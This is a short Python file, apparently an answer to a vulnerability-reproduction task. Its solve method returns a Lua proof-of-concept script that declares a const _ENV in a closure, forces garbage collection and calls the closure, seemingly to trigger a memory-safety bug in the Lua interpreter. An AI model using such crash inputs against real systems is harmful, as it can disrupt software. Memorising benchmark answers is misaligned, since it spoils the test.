import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "local function make()\n"
            "  local _ENV <const> = {}\n"
            "  return function()\n"
            "    y = 1\n"
            "    return y\n"
            "  end\n"
            "end\n"
            "local f = make()\n"
            "collectgarbage('collect')\n"
            "collectgarbage('collect')\n"
            "return f()\n"
        )
        return poc.encode('utf-8')
